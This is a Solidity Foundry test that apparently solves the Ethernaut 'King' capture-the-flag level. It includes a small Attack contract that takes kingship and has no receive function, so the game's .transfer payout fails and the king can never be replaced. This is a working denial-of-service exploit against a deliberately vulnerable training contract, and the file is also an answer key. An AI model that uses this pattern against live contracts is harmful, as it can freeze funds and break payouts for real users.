// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/King.sol";

/// @custom:win-condition 
// The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

// Such a fun game. Your goal is to break it.

// When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.


/// @custom:lesson-learned
/// .transfer can fail if their is no receive function. We can keep kingship by not having a receive function, breaking the King contract.

contract Attack {
    constructor(address _victim) payable {
        (bool success, ) = address(_victim).call{value: 1 ether}("");
    }
}

contract KingSolvedTest is Test {

  King public s_king;
  address payable s_user;

  function setUp() public {
    s_king = new King();
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
  }

  function testWinCondition() public {

    assertEq(s_king._king() == address(this), true);

    vm.prank(s_user);
    Attack attack = new Attack{value: 1 ether}(address(s_king));

    assertEq(s_king._king() == address(attack), true);

    // attempt to reclaim kinship, should fail
    (bool success, ) = address(s_king).call{value: 1 ether}("");

    assertFalse(success);
    assertFalse(s_king._king() == address(this));
    assertEq(s_king._king() == address(attack), true);
  }

  receive() external payable {

  }
 
}